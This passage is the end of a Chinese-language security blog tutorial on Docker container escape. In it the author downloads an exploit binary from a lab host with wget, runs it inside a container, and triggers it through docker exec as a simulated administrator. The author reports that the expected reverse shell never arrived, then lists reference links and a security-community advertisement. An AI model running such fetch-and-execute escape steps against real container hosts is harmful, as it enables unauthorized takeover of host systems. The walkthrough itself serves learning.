![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4YW2xU7F155nPAaQn6q3iarsDbMHSDAgsX3icgsZLYMRyicsZvwgurnElA/640?wx_fmt=png)

在 docker 容器中下载该 exp，并赋予执行权限，执行

```
wget http://192.168.198.128:8080/main
chmod u+x main
./main
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4iaSn1fic0rvdaIZZQNeT6ZAgcEuap7YtibFKTojuib4g5M4YX136LiauP1A/640?wx_fmt=png)

然后这里我们假装为宿主机管理员，现在进入到该容器中

```
docker ps
docker exec -it 3056c91f69ea
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4B43KV8bsYfUp7rT7FicmPib5gcraesVLa8nlMkicYiaBtC6iazmx8W8ZicHw/640?wx_fmt=png)

这时再来看我们的 docker 容器里执行的 exp 已然被执行  

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4xbFBiaGxgg0ZibKoAGfcDX5nYY208rCKf0x462USvJAEfZLc58xUlXDA/640?wx_fmt=png)

但是奇怪的是并没有反弹过来 shell，其他命令也无法被执行，修改了 n 次 paylaod 也无果，希望有成功的大佬能告知小弟步骤哪里错了。  
至此，Docker 逃逸章节完结，撒花~~  

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V47kAib8O3LbJ3P7AZyFmUYiacTbGTbpSpcB0XIegVdriah0qByp397kqIg/640?wx_fmt=png)

参考链接：  
https://blog.csdn.net/qq_69775412/article/details/124265678  
https://cloud.tencent.com/developer/article/1987725  
https://copyfuture.com/blogs-details/202206262308472625  
https://www.freebuf.com/vuls/264843.html  
https://segmentfault.com/a/1190000040980305

![](https://mmbiz.qpic.cn/mmbiz_gif/rTicZ9Hibb6RWbGNtVfIZbm2rmGO4hQDzQUrLN62vEGlA4fPmib5utUAp9gbQicb6FC82RjsVI5vx7wEc9yAAiaFEoQ/640?wx_fmt=gif)

E

N

D

  

**知识星球产品及服务**

**团队内部平台**：潮汐在线指纹识别平台 | 潮听漏洞情报平台 | 潮巡资产管理与威胁监测平台 | 潮汐网络空间资产测绘 | 潮声漏洞检测平台 | 在线免杀平台 | CTF 练习平台 | 物联网固件检测平台 | SRC 资产监控平台  | ......

**星球分享方向**:Web 安全 | 红蓝对抗 | 移动安全 | 应急响应 | 工控安全 | 物联网安全 | 密码学 | 人工智能 | ctf 等方面的沟通及分享

**星球知识 wiki**：红蓝对抗 | 漏洞武器库 | 远控免杀 | 移动安全 | 物联网安全 | 代码审计 | CTF | 工控安全 | 应急响应 | 人工智能 | 密码学 | CobaltStrike | 安全测试用例 | ......

**星球网盘资料**：安全法律法规 | 安全认证资料 | 代码审计 | 渗透安全工具 | 工控安全工具 | 移动安全工具 | 物联网安全 | 其它安全文库合辑  | ......

扫码加入一起学习吧~

![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn4bib2lic6dng5krLaNOdrDVLcLylWP1Op3Kibz2n6pOZjibrFd1xATEoZ6dXhaicMLgRQSicNQwGmDwicvA/640?wx_fmt=gif)

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUGxmZ0l89buUNbyVALKxic2nM7hnDCkAKIrjKhdcDfVkGq3PxNzgs7m55BBMwmicc0AvFpYcrd6J6Q/640?wx_fmt=jpeg)